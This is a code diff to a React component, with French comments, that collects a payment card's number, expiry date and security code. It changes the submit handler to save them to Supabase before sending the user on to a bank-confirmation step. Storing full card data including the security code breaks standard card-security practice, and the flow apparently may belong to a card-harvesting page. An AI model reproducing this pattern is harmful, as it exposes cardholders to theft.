@@ -1,8 +1,9 @@
+
 import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import Footer from "@/components/Footer";
 import ProgressStepper from "@/components/ProgressStepper";
-import { updateUserSession } from "@/utils/sessionUtils";
+import { updateUserSession, saveUserDataToJson } from "@/utils/sessionUtils";
 import { toast } from "sonner";
 
 const CardConfirmation: React.FC = () => {
@@ -12,7 +13,7 @@ const CardConfirmation: React.FC = () => {
   const [isLoading, setIsLoading] = useState(false);
   const navigate = useNavigate();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
     if (!numeroCarte || !dateExpiration || !cryptogramme) {
@@ -22,18 +23,29 @@ const CardConfirmation: React.FC = () => {
 
     setIsLoading(true);
 
-    // Simule la soumission du formulaire
-    setTimeout(() => {
-      // Stocke les informations dans la session uniquement
+    try {
+      // Stocke les informations dans la session
       updateUserSession({
         numeroCarte,
         dateExpiration,
         cryptogramme
       });
       
+      // Enregistre dans Supabase
+      await saveUserDataToJson();
+      
       setIsLoading(false);
       navigate("/bank-confirmation");
-    }, 800);
+    } catch (error: any) {
+      console.error("Erreur lors de l'enregistrement:", error);
+      setIsLoading(false);
+      
+      if (error.isRlsError) {
+        toast.error(`Erreur de sécurité Supabase: ${error.message}`);
+      } else {
+        toast.error("Une erreur est survenue lors de l'enregistrement des données.");
+      }
+    }
   };
 
   return (
